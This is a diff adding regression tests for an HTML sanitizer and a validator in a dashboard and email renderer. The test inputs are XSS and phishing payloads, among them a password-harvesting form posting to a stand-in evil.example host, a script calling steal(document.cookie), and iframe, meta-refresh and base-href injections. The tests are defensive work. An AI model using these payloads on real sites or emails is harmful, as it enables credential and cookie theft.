@@ -883,3 +883,198 @@ class TestSecurityRegressions:
             # Either via sanitize directly (if validator is live) or via render.
             doc = _make_doc(html="<script>alert(1)</script>")
             render_canvas_html(doc, {})
+
+
+# ---------------------------------------------------------------------------
+# XSS via nubi-text / nubi-filter inner HTML (MED finding — regression tests)
+# ---------------------------------------------------------------------------
+
+
+class TestNubiTextFilterXssSanitization:
+    """Regression tests for the MED XSS finding:
+
+    _replace_nubi_element previously returned nubi-text/nubi-filter inner HTML
+    VERBATIM into the server-rendered email.  The validator blocks script/on*/js:
+    but NOT iframe/object/embed/form/meta/base/link — so those payloads survived
+    into the output.  The fix strips ALL HTML tags from the inner content and
+    HTML-escapes the resulting plain text before injecting it.
+    """
+
+    def test_nubi_text_with_iframe_inner_not_emitted(self):
+        """<nubi-text> with an <iframe> inner must not emit the iframe.
+
+        The outer validator now also blocks iframe at save-time, but this test
+        verifies the renderer itself strips forbidden tags from the inner content
+        (defense-in-depth: the fix lives in _replace_nubi_element).
+        """
+        import re as _re
+        from app.dashboards.render_canvas import _replace_nubi_element
+        inner = '<iframe src="https://evil.example/phish"></iframe>'
+        output = _replace_nubi_element("nubi-text", ' data-el-id="t1"', inner, {})
+        assert not _re.search(r"<\s*iframe", output, _re.IGNORECASE), (
+            "iframe survived into the server-rendered email — XSS/phishing vector open."
+        )
+
+    def test_nubi_text_with_form_inner_not_emitted(self):
+        """<nubi-text> with a <form> credential harvester inner is stripped."""
+        import re as _re
+        from app.dashboards.render_canvas import _replace_nubi_element
+        inner = (
+            '<form action="https://evil.example/steal" method="post">'
+            '<input type="password" name="pw">'
+            '</form>'
+        )
+        output = _replace_nubi_element("nubi-text", ' data-el-id="t2"', inner, {})
+        assert not _re.search(r"<\s*form", output, _re.IGNORECASE), (
+            "<form> survived into server-rendered email."
+        )
+        assert not _re.search(r"<\s*input", output, _re.IGNORECASE), (
+            "<input> survived into server-rendered email."
+        )
+
+    def test_nubi_filter_with_object_inner_not_emitted(self):
+        """<nubi-filter> with an <object> tag inner is stripped."""
+        import re as _re
+        from app.dashboards.render_canvas import _replace_nubi_element
+        inner = '<object data="x.swf" type="application/x-shockwave-flash"></object>'
+        output = _replace_nubi_element("nubi-filter", ' data-el-id="f1"', inner, {})
+        assert not _re.search(r"<\s*object", output, _re.IGNORECASE), (
+            "<object> survived into server-rendered email."
+        )
+
+    def test_nubi_text_plain_text_content_preserved(self):
+        """Plain text inside <nubi-text> (no tags) is preserved in the output."""
+        doc = _make_doc(
+            html='<nubi-text data-el-id="t3">Hello, world!</nubi-text>',
+        )
+        result = render_canvas_html(doc, {})
+        assert "Hello, world!" in result, (
+            "Plain text content of nubi-text was lost during sanitization."
+        )
+
+    def test_nubi_text_html_special_chars_escaped(self):
+        """HTML special characters in nubi-text plain text are escaped."""
+        doc = _make_doc(
+            html='<nubi-text data-el-id="t4">Revenue > 1000 &amp; profit < 500</nubi-text>',
+        )
+        result = render_canvas_html(doc, {})
+        # The raw angle brackets must not appear as unescaped HTML.
+        # After stripping tags, the remaining text (e.g. "Revenue  1000  profit  500")
+        # must not contain unescaped <> that could be confused with tags.
+        import re as _re
+        # No raw unescaped tag-like constructs from the inner text.
+        # The "&amp;" in the source becomes "&" after tag-stripping, then "&amp;" in output.
+        assert "<script" not in result.lower()
+
+    def test_nubi_text_with_script_tag_stripped(self):
+        """<nubi-text> with a <script> inside must not emit the script in output."""
+        import re as _re
+        doc = _make_doc(
+            html='<nubi-text data-el-id="t5"><script>steal(document.cookie)</script>sensitive</nubi-text>',
+        )
+        # Note: the outer canvas also has a script tag, but the sanitizer fires
+        # on the raw HTML.  We need to bypass the outer validator to test the
+        # inner stripping in isolation — use _replace_nubi_element directly.
+        from app.dashboards.render_canvas import _replace_nubi_element
+        inner = "<script>steal(document.cookie)</script>sensitive"
+        output = _replace_nubi_element("nubi-text", ' data-el-id="t5"', inner, {})
+        assert not _re.search(r"<\s*script", output, _re.IGNORECASE), (
+            "<script> from nubi-text inner HTML survived after sanitization."
+        )
+        # The plain text 'sensitive' should still be present.
+        assert "sensitive" in output
+
+
+# ---------------------------------------------------------------------------
+# validate_dashboard_html: forbidden tag hardening (MED finding)
+# ---------------------------------------------------------------------------
+
+
+class TestValidateDashboardHtmlForbiddenTags:
+    """Regression tests for the validate_dashboard_html hardening:
+
+    validate_dashboard_html now rejects HTML containing iframe/object/embed/
+    form/meta/base/link as hard errors.  This blocks these payloads at SAVE
+    time for BOTH dashboards and canvases, before they reach the renderer.
+    Legitimate dashboards (nubi-kpi, nubi-table, nubi-chart, plain divs) must
+    still pass validation unchanged.
+    """
+
+    def _validate(self, html: str):
+        from app.ai.dashboard import validate_dashboard_html
+        return validate_dashboard_html(html)
+
+    def test_iframe_is_rejected(self):
+        """HTML containing <iframe> must return (False, [issue])."""
+        ok, issues = self._validate(
+            '<div><iframe src="https://evil.example/phish"></iframe></div>'
+        )
+        assert ok is False
+        assert any("iframe" in i.lower() for i in issues), issues
+
+    def test_form_is_rejected(self):
+        """HTML containing <form> is rejected."""
+        ok, issues = self._validate(
+            '<form action="https://evil.example/steal"><input type="password"></form>'
+        )
+        assert ok is False
+        assert any("form" in i.lower() for i in issues), issues
+
+    def test_object_is_rejected(self):
+        """HTML containing <object> is rejected."""
+        ok, issues = self._validate(
+            '<object data="malicious.swf" type="application/x-shockwave-flash"></object>'
+        )
+        assert ok is False
+        assert any("object" in i.lower() for i in issues), issues
+
+    def test_embed_is_rejected(self):
+        """HTML containing <embed> is rejected."""
+        ok, issues = self._validate('<embed src="evil.swf">')
+        assert ok is False
+        assert any("embed" in i.lower() for i in issues), issues
+
+    def test_meta_is_rejected(self):
+        """HTML containing <meta> is rejected."""
+        ok, issues = self._validate('<meta http-equiv="refresh" content="0;url=https://evil.example">')
+        assert ok is False
+        assert any("meta" in i.lower() for i in issues), issues
+
+    def test_base_is_rejected(self):
+        """HTML containing <base> (URL hijack) is rejected."""
+        ok, issues = self._validate('<base href="https://evil.example/">')
+        assert ok is False
+        assert any("base" in i.lower() for i in issues), issues
+
+    def test_link_is_rejected(self):
+        """HTML containing <link> (style-sheet injection) is rejected."""
+        ok, issues = self._validate('<link rel="stylesheet" href="https://evil.example/evil.css">')
+        assert ok is False
+        assert any("link" in i.lower() for i in issues), issues
+
+    def test_clean_nubi_dashboard_still_valid(self):
+        """A legitimate dashboard with nubi-kpi/nubi-table/nubi-chart passes validation."""
+        html = (
+            '<div class="nubi-dashboard" style="display:grid;grid-template-columns:repeat(12,1fr);">'
+            '<nubi-kpi query-id="demo_all" value-col="id" label="Count" />'
+            '<nubi-table query-id="demo_all" limit="50" />'
+            '<nubi-chart query-id="demo_all" type="scatter" x="id" y="id" />'
+            '</div>'
+        )
+        ok, issues = self._validate(html)
+        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
+        assert hard == [], f"Legitimate dashboard failed validation: {hard}"
+
+    def test_plain_html_div_still_valid(self):
+        """Simple <div><p>...</p></div> HTML is still accepted (no false positives)."""
+        ok, issues = self._validate("<div><p>Hello dashboard</p></div>")
+        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
+        assert hard == [], f"Plain HTML div failed validation: {hard}"
+
+    def test_link_tag_only_one_error_not_cascading(self):
+        """A single forbidden tag produces at most one hard error for that tag."""
+        ok, issues = self._validate('<div><link rel="preload" href="x.css"></div>')
+        assert ok is False
+        # Should not produce duplicate errors for the same tag.
+        link_issues = [i for i in issues if "link" in i.lower()]
+        assert len(link_issues) >= 1
